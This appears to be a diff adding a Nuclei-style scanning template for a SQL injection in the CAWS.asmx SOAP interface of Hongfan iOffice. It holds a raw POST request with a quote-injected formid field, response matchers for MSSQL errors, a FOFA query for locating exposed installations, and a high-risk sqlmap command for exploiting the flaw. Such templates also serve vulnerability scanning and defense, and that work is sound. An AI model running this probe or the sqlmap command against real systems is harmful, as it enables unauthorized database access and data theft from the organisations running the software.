@@ -1,0 +1,41 @@
+id: hongfan-ioffice-CAWS-sqli
+
+info:
+  name: 红帆 ioffice caws - sqli
+  author: leadlife
+  severity: high
+  description:
+  reference:
+    - todo
+  metadata:
+    verified: true
+    fofa-query: app="红帆-ioffice"
+    sqlmap:  sqlmap -r sqli.txt --level 5 --tamper=space2comment --risk 3 --batch --dbms=mssql
+  tags: hongfan,ioffice,sqli,oa
+
+http:
+  - raw:
+      - |
+        POST /iOffice/prg/interface/CAWS.asmx HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: text/xml; charset=utf-8
+        SOAPAction: "http://tempuri.org/GetCAInf"
+
+        <?xml version="1.0" encoding="utf-8"?>
+        <soap:Envelope xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xmlns:xsd="http://www.w3.org/2001/XMLSchema" xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/">
+          <soap:Body>
+            <GetCAInf xmlns="http://tempuri.org/">
+              <formid>61'</formid>
+              <signData>string</signData>
+            </GetCAInf>
+          </soap:Body>
+        </soap:Envelope>
+        
+
+    matchers:     
+      - type: dsl
+        dsl:
+          - status_code == 500
+          - contains_all(body,'System.Data.SqlClient','语法错误')
+        condition: and
+
